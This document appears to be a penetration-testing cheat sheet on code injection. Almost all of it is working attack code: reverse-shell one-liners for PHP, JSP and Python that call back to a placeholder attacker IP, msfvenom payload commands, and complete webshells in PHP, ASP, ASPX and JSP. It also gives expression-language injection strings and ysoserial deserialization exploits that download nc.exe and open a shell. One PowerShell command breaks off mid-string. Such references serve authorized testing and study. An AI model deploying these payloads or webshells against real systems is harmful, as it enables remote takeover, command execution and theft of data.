# Code Injection

## PHP

### Reverse shell

Linux&#x20;

```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"); php?>
```

From msfvenom

```
msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -f raw -o payload.php
```

### Webshell

```
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

### Code injection

Inject terminal commands

```
echo exec("<cmd>");
echo passthru("<cmd>");
echo system("<cmd>");
echo shell_exec("<cmd>");
echo `<cmd>`;
```

Inject PHP code (PHP delimiters not required)

```
eval('<php code>')
assert('<php code>')
```

Information gathering

```
phpinfo();
posix_mkfifo();
posix_getlogin();
posix_ttyname();
getenv();
get_current_user();
proc_get_status();
get_cfg_var();
disk_free_space();
disk_total_space();
diskfreespace();
getcwd();
getlastmo();
getmygid();
getmyinode();
getmypid();
getmyuid();
```

## .NET

### Reverse shell

From msfvenom

```
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f asp -o rv.asp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f asp -o rv.asp

msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f aspx -o rv.aspx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f aspx -o rv.aspx
```

### Webshell

ASP

```
<%@ Language=VBScript %>
<%
  Dim oScript
  Dim oScriptNet
  Dim oFileSys, oFile
  Dim szCMD, szTempFile
  On Error Resume Next
  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
  Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
  Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
  szCMD = Request.Form(".CMD")
  If (szCMD <> "") Then
    szTempFile = "C:\" & oFileSys.GetTempName( )
    Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
    Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
  End If
%>
<HTML>
<BODY>
<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
<input type=text name=".CMD" size=45 value="<%= szCMD %>">
<input type=submit value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<br>
<%
  If (IsObject(oFile)) Then
    On Error Resume Next
    Response.Write Server.HTMLEncode(oFile.ReadAll)
    oFile.Close
    Call oFileSys.DeleteFile(szTempFile, True)
  End If
%>
</BODY>
</HTML>
```

ASPX

```
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>
```

## Java

### Reverse shell

JSP File

<pre><code><strong>&#x3C;%=Process p=new ProcessBuilder("/bin/bash -c 'bash -i >&#x26; /dev/tcp/&#x3C;IP>/&#x3C;PORT> 0>&#x26;1'").redirectErrorStream(true).start();Socket s=new Socket("&#x3C;host>",&#x3C;port>);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();%>
</strong></code></pre>

JSP From Msfvenom

```
msfvenom -p java/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f jsp -o rv.jsp
```

From WAR file

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<HOST> LPORT=<PORT> -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file
```

### Webshell

```
<FORM METHOD=GET ACTION='cmdjsp.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>

<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";

   if(cmd != null) {
      String s = null;
      try {
         String cmdFull = cmd;
         if(System.getProperty("os.name").toLowerCase().startsWith("windows")){
            cmdFull = "cmd.exe /C " + cmd;
         }
         Process p = Runtime.getRuntime().exec(cmdFull);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) {
            output += s;
         }
      }
      catch(IOException e) {
         e.printStackTrace();
      }
   }
%>

<pre>
<%=output %>
</pre>
```

### Parameter injection

Inject terminal commands

```
${T(java.lang.Runtime).getRuntime().exec('<cmd>')}
<%=T(java.lang.Runtime).getRuntime().exec('<cmd>')%>
```

Information gathering

```
${class.getClassLoader()}
${class.getResource("").getPath()}
${T(java.lang.System).getenv()}

<%=class.getClassLoader()%>
<%={class.getResource("").getPath()%>
<%={T(java.lang.System).getenv()%>
```

### Deserialization

Exploit Java deserialization vulnerabilities using ysoserial (requires java installed on local machine). Can be downloaded from [here](https://github.com/frohoff/ysoserial)

#### Deploy payload

```
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <IP> <port> CommonsCollections1 <command or payload>
```

#### NC upload and reverse shell

```
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <IP> <port> CommonsCollections1 "powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://<local ip>/nc.exe','C:\<path>\nc.exe')\""
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <IP> <port> CommonsCollections1 "C:\<target folder>\nc.exe -nv <local ip> <local port> -e cmd.exe"
```

#### Powershell

```
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit <IP> <port> CommonsCollections1 "powershell -c \"$c
```

## Python

### Reverse shell

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Parameter injection

Inject terminal code

```
os.system("<cmd>")
import os;print(str(os.popen('<cmd>').read()));
```
